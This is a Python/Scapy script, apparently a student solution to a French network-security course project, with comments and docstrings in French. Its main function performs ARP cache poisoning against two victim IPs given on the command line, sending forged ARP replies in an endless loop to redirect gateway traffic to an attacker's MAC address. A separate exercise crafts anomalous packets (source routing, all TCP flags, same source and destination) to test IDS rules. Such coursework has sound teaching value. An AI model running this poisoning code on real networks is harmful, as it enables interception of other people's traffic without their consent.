#! /usr/bin/python3

# ARP Poisoning with Scapy

from scapy.all import *
import sys
import socket
import fcntl
import struct
import time

def get_local_ip_address(ifname):
    """
    retourne l’adresse IP d’une interface réseau en fonction de son nom système (ex. ‘eth0’) donné en argument
    """
    ifb=bytearray(ifname,"ascii")
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8915, struct.pack('256s', ifb[:15]))

    return socket.inet_ntoa(info[20:24])

def get_local_mac_addr(ifname):
    """
    retourne l’adresse MAC d’une interface réseau en fonction de son nom système (ex. ‘eth0’) donné en argument.
    """
    mac = open('/sys/class/net/%s/address' % ifname).read().strip('\n')
    return mac

def get_remote_mac_addr(IP):
    """
    PROJET 2 PARTIE 1:
    Il s’agit de compléter la fonction get_remote_mac_addr qui doit retourner une
    chaine de caractères correspondant à l’adresse MAC de l’adresse IP donnée en
    argument.
    Pour cela, il faut construire un paquet Ethernet envoyé en broadcast contenant un
    paquet ARP bien construit.
    """
    print("[*]starting mac resolution for {}".format(IP))
    ifname = 'enp3s0'
    try:
        monIP = get_local_ip_address(ifname)
    except:
        # solution de substitution la fonction donnée pour l'éxercice renvoie l'erreur: "s doit etre de type bytes"
        monIP =  str(input('function "get_local_ip_address(ifname)" failed, please enter local IP \n>>>'))

    print('Local IP: {}'.format(monIP))
    maMac = get_local_mac_addr(ifname)
    print('Local Mac: {}'.format(maMac))

    arp_request = Ether( dst = 'ff:ff:ff:ff:ff:ff' ) / ARP( hwtype = 0x1, ptype = 0x800 , hwlen = 6 , plen = 4 , op = 1 , psrc = monIP , hwsrc = maMac, pdst = IP, hwdst = '00:00:00:00:00:00' )
    reponse = srp1(arp_request, timeout = 5) #on recupere la premiere réponse
    try:
        reponse.show()
        print("[*] IP: {} -> mac: {}".format(IP, reponse[ARP].hwsrc))
        return reponse[ARP].hwsrc
    except:
        return None


def arp_cache_psn(IP_victime1, IP_victime2):
    """
    Partie 2 : ARP cache poisening
    En vous appuyant sur la partie 1, écrire un script qui réalise l’empoisonnement du
    cache ARP pour deux cibles dont les adresses IP sont données en arguments en ligne
    de commande
    """
    #resolution des adresses mac des 2 victime
    mac_victime1 = get_remote_mac_addr(IP_victime1)
    mac_victime2 = get_remote_mac_addr(IP_victime2)

    if mac_victime1 == None or mac_victime2 == None:
        print("[!] failed mac resolution!")
        exit()

    #nous redirigeons les trames a destination de la passerelle vers une mac saisie par l'utilisateur:
    IP_passerelle, mac_attaquant = '',''
    IP_passerelle = str(input('Destianation IP of communication that you want interecpt (usually the Gateway) ? (default = "192.168.1.254") \n>>>'))
    if IP_passerelle == '':
        IP_passerelle = '192.168.1.254'
    mac_attaquant = str(input('mac address to use for redirection ? (default = "aa:bb:cc:dd:ee:ff")\>>>'))
    if mac_attaquant == '':
        mac_attaquant = 'aa:bb:cc:dd:ee:ff'

    #forge des "gratuitous arp"
    poison1 = Ether( src = mac_victime2, dst = mac_victime1 ) / ARP ( hwtype = 0x1, ptype = 0x800 , hwlen = 6 , plen = 4 , op = 2 , psrc = IP_passerelle , hwsrc = mac_attaquant, pdst = IP_passerelle, hwdst = mac_attaquant )
    poison2 = Ether( src = mac_victime1, dst = mac_victime2 ) / ARP ( hwtype = 0x1, ptype = 0x800 , hwlen = 6 , plen = 4 , op = 2 , psrc = IP_passerelle, hwsrc = mac_attaquant, pdst = IP_passerelle, hwdst = mac_attaquant )

    while 1:
        time.sleep(1)
        for pkt in [poison1,poison2]:
            sendp(pkt)

def exercice1():
    """
    Exercice 1 : détection d’intrusion
    Afin de tester vos règles configurant un IDS (Intrusion Detection System), vous
    décidez d’écrire un script Python avec Scapy pour envoyer les paquets suivants :
    """

    print("Envoi d’un paquet IP à destination du réseau 193.55.51.0/24")
    p=Ether() /IP(dst = '193.55.51.1')
    #p.show()
    send(p)
    print("Envoi d’un paquet ICMP echo-request vers l’adresse 193.48.120.32 avec un TTL de 129")
    p= (Ether() / IP( dst='193.48.120.32', ttl = 129) / ICMP ( type = 8 , code=0  ) )
    p.show()
    send(p)

    print('Envoi d’un paquet IP avec l’option LSR activée')
    #(utiliser la commande ls() pouridentifier la classe nécessaire pour les options IP)
    LSR = IPOption_LSRR( routers = ['192.168.1.254'])
    p = Ether() / IP( options = LSR, dst = '192.168.1.254')
    p.show()
    send(p)

    print('Envoi d’un paquet IP avec l’option SSR activée')
    SSR = IPOption_SSRR( routers = ['192.168.1.254'])
    p = Ether() / IP( options = SSR, dst = '192.168.1.254')
    p.show()
    send(p)

    print('Envoi d’un paquet UDP contenant dans le champ donnée la séquence d’octets « TOP SECRET »')
    p = Ether() / IP( dst = '192.168.1.254') / UDP(dport = 53) / Raw ( load = b'TOP SECRET')
    p.show()
    send(p)

    print('Envoi d’un paquet UDP contenant dans le champ une séquence d’octets dont la valeur donnée en hexadécimal est 0x50 0x4B 0x03 0x04')
    p = Ether() / IP( dst = '192.168.1.254') / UDP(dport = 53) / Raw ( load = '\x50\x4B\x03\x04')
    p.show()
    send(p)

    print('Envoi d’un paquet TCP avec tous les drapeaux activés (SYN, FIN, RST, ACK,URG, PSH)')
    p = Ether() / IP( dst = '192.168.1.254') / TCP( flags='UAPRSF')
    p.show()
    send(p)

    #Envoi d’un paquet IP ayant la même adresse IP en source et destination
    p = Ether() / IP( dst = '192.168.1.254')
    p[IP].src = p[IP].dst
    p.show()
    send(p)


if __name__ == '__main__':

    #execrice 1:
    #exercice1()

    #projet 2 partie 1:
    #result = get_remote_mac_addr('192.168.1.254')
    #print(result)

    #projet 2 partie 2:
    arp_cache_psn(sys.argv[1], sys.argv[2])
